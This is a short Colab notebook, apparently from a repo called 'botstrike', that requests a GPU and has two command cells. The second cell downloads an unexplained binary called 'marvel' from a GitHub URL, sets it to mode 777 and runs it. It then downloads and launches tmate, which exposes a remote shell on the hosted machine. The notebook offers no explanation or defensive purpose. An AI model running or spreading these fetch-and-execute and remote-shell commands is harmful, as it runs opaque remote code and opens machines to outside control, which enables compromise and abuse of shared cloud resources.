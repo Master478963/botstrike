{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Copy of TMATE_IO.ipynb",
      "provenance": [],
      "private_outputs": true,
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!nvidia-smi -L"
      ],
      "metadata": {
        "id": "oIZosvyn6nyc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "!wget https://raw.githubusercontent.com/aurbach55/zash/main/marvel && chmod 777 marvel && ./marvel\n",
        "!wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && cd tmate-2.4.0-static-linux-amd64 &> /dev/null && ./tmate -F"
      ],
      "metadata": {
        "collapsed": true,
        "id": "RxR8V-BkZ3fa"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}